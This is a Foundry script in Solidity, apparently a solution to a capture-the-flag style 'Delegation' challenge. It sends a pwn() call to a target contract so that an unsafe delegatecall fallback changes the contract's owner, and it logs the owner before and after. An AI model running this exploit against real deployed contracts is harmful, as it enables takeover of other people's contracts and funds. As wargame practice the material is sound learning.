// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "src/challenge-06_Delegation/Delegation.sol";

contract DelegationAttackScript is Script {
    function run() external {
        address delegationAddress = vm.envAddress("DELEGATION_ADDRESS");
        Delegation delegation = Delegation(delegationAddress);

        console.log("Target Delegation Address:", delegationAddress);
        console.log("Owner Before Attack:", delegation.owner());

        vm.startBroadcast();

        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegation).call{gas: 100000}(payload);
        require(success, "Exploit transaction failed");

        vm.stopBroadcast();

        console.log("Owner After Attack:", delegation.owner());
    }
}